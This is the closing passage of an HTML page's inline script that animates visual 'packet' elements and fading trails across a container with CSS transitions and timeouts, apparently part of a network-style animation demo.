					trail.className = 'packet-trail';
					trail.style.left = startX + 'px';
					trail.style.top = startY + 'px';
					trail.style.background = color;
					trail.style.opacity = 0.6 - (i * 0.1);
					trail.style.transform = 'translate(-50%, -50%)';
					container.appendChild(trail);

					requestAnimationFrame(() => {
						trail.style.transition = `all ${(1.2 + i*0.1)/animSpeed}s ease-out`;
						trail.style.left = endX + 'px';
						trail.style.top = endY + 'px';
						trail.style.opacity = '0';
					});

					setTimeout(() => trail.remove(), (1500 + i*100)/animSpeed);
				}, (i * 80)/animSpeed);
			}

			setTimeout(() => {
				packet.style.left = endX + 'px';
				packet.style.top = endY + 'px';
			}, 50);
		});

		setTimeout(() => {
			packet.style.opacity = '0';
			packet.style.transform = 'translate(-50%, -50%) scale(1.5)';
			setTimeout(() => {
				packet.remove();
				callback();
			}, 300/animSpeed);
		}, 1200/animSpeed);
	}
	</script>
</body>
</html>
